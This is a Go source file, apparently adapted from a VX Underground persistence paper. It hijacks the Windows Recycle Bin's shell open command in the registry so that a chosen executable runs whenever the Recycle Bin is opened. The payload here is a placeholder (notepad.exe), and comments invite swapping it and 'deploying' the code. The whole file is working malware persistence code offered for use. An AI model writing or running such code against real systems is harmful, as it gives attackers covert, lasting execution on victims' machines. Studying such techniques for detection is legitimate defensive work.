// This script sets a custom payload in the Windows registry, targeting the Recycle Bin shell command.
// I haven’t read anywhere if this operation can be done without administrator privileges but testing
// in my Windows it always returned “Access denied”

// Source: https://github.com/vxunderground/VXUG-Papers/tree/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin

package main

import (
	"fmt"
	"log"

	"golang.org/x/sys/windows/registry"
)

func openRegistryKey(path string, debug bool) (registry.Key, error) {
	if debug {
		fmt.Println("Accessing registry key...")
	}

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.WRITE)
	if err != nil {
		return registry.Key(0), fmt.Errorf("error opening registry key: %w", err)
	}
	return key, nil
}

func createCommandKey(parentKey registry.Key, debug bool) (registry.Key, error) {
	if debug {
		fmt.Println("Creating command key...")
	}

	commandKey, _, err := registry.CreateKey(parentKey, "open\\command", registry.ALL_ACCESS)
	if err != nil {
		return registry.Key(0), fmt.Errorf("error creating command key: %w", err)
	}
	return commandKey, nil
}

func setRegistryPayload(commandKey registry.Key, payload string, debug bool) error {
	if debug {
		fmt.Printf("Setting payload to '%s'...\n", payload)
	}

	if err := commandKey.SetStringValue("", payload); err != nil {
		return fmt.Errorf("error setting payload: %w", err)
	}
	return nil
}

// configureRegistryPayload ties together the steps to set a custom payload.
// In Windows there are some folders which have have uniques CLSID values like
// the ones for the “Recycle Bin” {645ff040-5081-101b-9f08-00aa002f954e}
func configureRegistryPayload(payload string, debug bool) error {
	const registryPath = `SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell`

	// Step 1: Open the registry key.
	binKey, err := openRegistryKey(registryPath, debug)
	if err != nil {
		return err
	}
	defer binKey.Close()

	// Step 2: Create the command subkey.
	commandKey, err := createCommandKey(binKey, debug)
	if err != nil {
		return err
	}
	defer commandKey.Close()

	// Step 3: Set the specified payload as the command value.
	return setRegistryPayload(commandKey, payload, debug)
}

func main() {
	payload := "notepad.exe" // Modify this to set a custom executable
	debug := true            // Don't be a dummy, disable debug when deploying :D

	if err := configureRegistryPayload(payload, debug); err != nil {
		if debug {
			log.Fatalf("Failed to set registry payload: %v", err)
		}
	} else {
		if debug {
			fmt.Println("Registry modification completed successfully!")
		}
	}
}
